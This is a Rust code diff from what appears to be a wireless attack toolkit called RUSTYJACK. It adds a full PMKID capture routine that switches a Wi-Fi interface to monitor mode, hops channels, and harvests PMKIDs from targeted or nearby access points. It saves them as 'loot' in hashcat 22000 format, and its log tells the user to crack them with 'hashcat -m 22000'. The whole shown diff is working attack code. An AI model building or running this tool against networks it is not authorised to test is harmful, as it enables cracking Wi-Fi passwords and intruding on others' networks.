@@ -14,7 +14,12 @@
 //! - Works on networks with no active clients
 //! - Faster acquisition (seconds vs minutes)
 
+use std::fs;
+use std::io::Write;
+use std::path::{Path, PathBuf};
 use std::time::{Duration, Instant};
+
+use chrono::Local;
 
 use crate::capture::{CaptureFilter, CapturedPacket, PacketCapture};
 use crate::error::{Result, WirelessError};
@@ -370,6 +375,251 @@ pub fn quick_pmkid_capture(
     iface.set_managed_mode()?;
 
     Ok(result)
+}
+
+/// Result of a PMKID capture session
+#[derive(Debug, Clone)]
+pub struct PmkidCaptureResult {
+    /// Number of PMKIDs captured
+    pub pmkids_captured: usize,
+    /// Total packets analyzed
+    pub packets_analyzed: u64,
+    /// Duration of capture
+    pub duration: Duration,
+    /// Hashcat format output file
+    pub hashcat_file: Option<PathBuf>,
+    /// Log file path
+    pub log_file: PathBuf,
+    /// The captured PMKIDs
+    pub captures: Vec<PmkidCapture>,
+}
+
+/// Configuration for PMKID capture
+#[derive(Debug, Clone)]
+pub struct PmkidConfig {
+    /// Interface to use (must support monitor mode)
+    pub interface: String,
+    /// Target BSSID (None = passive capture all)
+    pub bssid: Option<String>,
+    /// Target SSID (optional, for output labeling)
+    pub ssid: Option<String>,
+    /// Channel to capture on (0 = hop through common channels)
+    pub channel: u8,
+    /// Capture duration in seconds
+    pub duration: u32,
+}
+
+/// Execute PMKID capture with full loot output
+///
+/// This is the main entry point for PMKID capture operations.
+/// It handles:
+/// - Interface setup (monitor mode, channel)
+/// - Capture loop with progress callback
+/// - Writing hashcat 22000 format output
+/// - Detailed logging
+pub fn execute_pmkid_capture<F>(
+    loot_dir: &Path,
+    config: &PmkidConfig,
+    on_progress: F,
+) -> Result<PmkidCaptureResult>
+where
+    F: Fn(f32, &str),
+{
+    log::info!("Starting PMKID capture on interface {}", config.interface);
+    on_progress(0.05, "Initializing interface...");
+
+    // Validate interface
+    if !crate::is_wireless_interface(&config.interface) {
+        return Err(WirelessError::Interface(format!(
+            "{} is not a wireless interface",
+            config.interface
+        )));
+    }
+
+    // Create loot directory
+    fs::create_dir_all(loot_dir)
+        .map_err(|e| WirelessError::System(format!("Failed to create loot dir: {}", e)))?;
+
+    let timestamp = Local::now().format("%Y%m%d_%H%M%S");
+    let target_name = config
+        .ssid
+        .as_ref()
+        .or(config.bssid.as_ref())
+        .map(|s| s.replace(|c: char| !c.is_alphanumeric() && c != '-' && c != '_', "_"))
+        .unwrap_or_else(|| "passive".to_string());
+
+    let logs_dir = loot_dir.join("logs");
+    fs::create_dir_all(&logs_dir)
+        .map_err(|e| WirelessError::System(format!("Failed to create logs dir: {}", e)))?;
+
+    let log_file = logs_dir.join(format!("pmkid_{}_{}.txt", target_name, timestamp));
+
+    on_progress(0.10, "Enabling monitor mode...");
+
+    // Setup interface
+    let mut iface = WirelessInterface::new(&config.interface)?;
+    iface.set_monitor_mode()?;
+
+    // Set channel (0 means hop through common 2.4GHz channels)
+    let channels_to_scan: Vec<u8> = if config.channel == 0 {
+        vec![1, 6, 11, 2, 3, 4, 5, 7, 8, 9, 10]
+    } else {
+        vec![config.channel]
+    };
+
+    on_progress(0.15, "Starting capture...");
+
+    let mut capturer = PmkidCapturer::from_name(&config.interface)?;
+    let start = Instant::now();
+    let duration = Duration::from_secs(config.duration as u64);
+    let mut channel_idx = 0;
+    let mut last_channel_hop = Instant::now();
+    let channel_hop_interval = Duration::from_secs(2);
+    let mut packets_analyzed = 0u64;
+
+    // Target BSSID for filtering
+    let target_bssid: Option<MacAddress> = config
+        .bssid
+        .as_ref()
+        .and_then(|b| b.parse().ok());
+
+    // Create packet capture
+    let mut capture = PacketCapture::new(&config.interface)?;
+    capture.set_filter(CaptureFilter::eapol_only());
+
+    while start.elapsed() < duration {
+        // Channel hopping for passive mode
+        if channels_to_scan.len() > 1 && last_channel_hop.elapsed() > channel_hop_interval {
+            let ch = channels_to_scan[channel_idx % channels_to_scan.len()];
+            if iface.set_channel(ch).is_ok() {
+                log::debug!("Hopped to channel {}", ch);
+            }
+            channel_idx += 1;
+            last_channel_hop = Instant::now();
+        }
+
+        // Capture packets
+        if let Ok(Some(packet)) = capture.next_packet() {
+            packets_analyzed += 1;
+
+            if let Some(pmkid) = capturer.extract_pmkid(&packet) {
+                // Filter by target if specified
+                if let Some(ref target) = target_bssid {
+                    if pmkid.bssid != *target {
+                        continue;
+                    }
+                }
+
+                let mut capture_entry = pmkid.clone();
+                capture_entry.ssid = config.ssid.clone();
+                capturer.captures.push(capture_entry);
+
+                log::info!(
+                    "Captured PMKID from BSSID {} (total: {})",
+                    pmkid.bssid,
+                    capturer.captures.len()
+                );
+
+                let progress = (start.elapsed().as_secs_f32() / duration.as_secs_f32()).min(0.9);
+                on_progress(
+                    0.15 + progress * 0.7,
+                    &format!("Captured {} PMKID(s)", capturer.captures.len()),
+                );
+            }
+        }
+
+        // Progress update
+        let elapsed_pct = start.elapsed().as_secs_f32() / duration.as_secs_f32();
+        if (elapsed_pct * 10.0) as u32 != ((elapsed_pct - 0.1) * 10.0).max(0.0) as u32 {
+            on_progress(
+                0.15 + elapsed_pct.min(0.85) * 0.7,
+                &format!(
+                    "Scanning... {} PMKID(s), {} packets",
+                    capturer.captures.len(),
+                    packets_analyzed
+                ),
+            );
+        }
+    }
+
+    on_progress(0.90, "Saving captures...");
+
+    // Restore managed mode
+    if let Err(e) = iface.set_managed_mode() {
+        log::warn!("Failed to restore managed mode: {}", e);
+    }
+
+    // Save hashcat format file if we captured anything
+    let mut hashcat_file = None;
+    if !capturer.captures.is_empty() {
+        let hc_path = loot_dir.join(format!("pmkid_{}_{}.hc22000", target_name, timestamp));
+        let hashcat_lines = capturer.export_hashcat();
+
+        let mut file = fs::File::create(&hc_path)
+            .map_err(|e| WirelessError::System(format!("Failed to create hashcat file: {}", e)))?;
+
+        for line in &hashcat_lines {
+            writeln!(file, "{}", line)
+                .map_err(|e| WirelessError::System(format!("Failed to write: {}", e)))?;
+        }
+
+        hashcat_file = Some(hc_path);
+    }
+
+    // Write log file
+    let mut log_content = String::new();
+    log_content.push_str("====================================================\n");
+    log_content.push_str("    RUSTYJACK PMKID CAPTURE LOG                     \n");
+    log_content.push_str("====================================================\n\n");
+    log_content.push_str(&format!(
+        "Timestamp: {}\n",
+        Local::now().format("%Y-%m-%d %H:%M:%S")
+    ));
+    log_content.push_str(&format!("Interface: {}\n", config.interface));
+    log_content.push_str(&format!("Duration: {} seconds\n", config.duration));
+    log_content.push_str(&format!(
+        "Target BSSID: {}\n",
+        config.bssid.as_deref().unwrap_or("(passive)")
+    ));
+    log_content.push_str(&format!(
+        "Target SSID: {}\n",
+        config.ssid.as_deref().unwrap_or("(any)")
+    ));
+    log_content.push_str(&format!("Channel(s): {:?}\n", channels_to_scan));
+    log_content.push_str("\n--- RESULTS ---------------------------------------\n");
+    log_content.push_str(&format!("Packets analyzed: {}\n", packets_analyzed));
+    log_content.push_str(&format!("PMKIDs captured: {}\n", capturer.captures.len()));
+
+    if !capturer.captures.is_empty() {
+        log_content.push_str("\nCaptured PMKIDs:\n");
+        for (i, cap) in capturer.captures.iter().enumerate() {
+            log_content.push_str(&format!(
+                "  {}. BSSID: {} | SSID: {}\n",
+                i + 1,
+                cap.bssid,
+                cap.ssid.as_deref().unwrap_or("(unknown)")
+            ));
+            log_content.push_str(&format!("     Hashcat: {}\n", cap.to_hashcat_22000()));
+        }
+    }
+
+    log_content.push_str("\n====================================================\n");
+    log_content.push_str("Use hashcat -m 22000 to crack the captured PMKIDs\n");
+    log_content.push_str("====================================================\n");
+
+    fs::write(&log_file, &log_content)
+        .map_err(|e| WirelessError::System(format!("Failed to write log: {}", e)))?;
+
+    on_progress(1.0, "Complete");
+
+    Ok(PmkidCaptureResult {
+        pmkids_captured: capturer.captures.len(),
+        packets_analyzed,
+        duration: start.elapsed(),
+        hashcat_file,
+        log_file,
+        captures: capturer.captures.clone(),
+    })
 }
 
 #[cfg(test)]
